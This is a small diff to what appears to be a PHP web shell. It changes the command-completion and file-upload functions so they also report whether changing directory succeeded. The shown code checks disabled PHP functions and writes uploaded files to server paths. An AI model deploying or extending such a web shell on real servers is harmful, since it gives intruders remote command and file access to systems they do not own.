@@ -70,7 +70,7 @@ function featureHint($fileName, $cwd, $type) {
     if (!isset($disable_functions)) {
         $disable_functions = array_flip(array_map('strtolower', array_map('trim', explode(',', trim(ini_get('disable_functions'))))));
     }
-    chdir($cwd);
+    $changed = chdir($cwd);
     if ($type == 'cmd') {
         $cmd = "compgen -c $fileName";
     } else {
@@ -105,6 +105,7 @@ function featureHint($fileName, $cwd, $type) {
     $files = explode("\n", $stdout);
     return array(
         'files' => $files,
+        'changed' => $changed,
     );
 }
 
@@ -124,12 +125,13 @@ function featureDownload($filePath) {
 }
 
 function featureUpload($path, $file, $cwd) {
-    chdir($cwd);
+    $changed = chdir($cwd);
     $f = @fopen($path, 'wb');
     if ($f === FALSE) {
         return array(
             'stdout' => array('Invalid path / no write permission.'),
-            'cwd' => getcwd()
+            'cwd' => getcwd(),
+            'changed' => $changed,
         );
     } else {
         $writed = null;
@@ -143,6 +145,7 @@ function featureUpload($path, $file, $cwd) {
         return array(
             'stdout' => array('Done.'),
             'cwd' => getcwd(),
+            'changed' => $changed,
             'writed' => $writed,
             'closed' => $closed,
         );
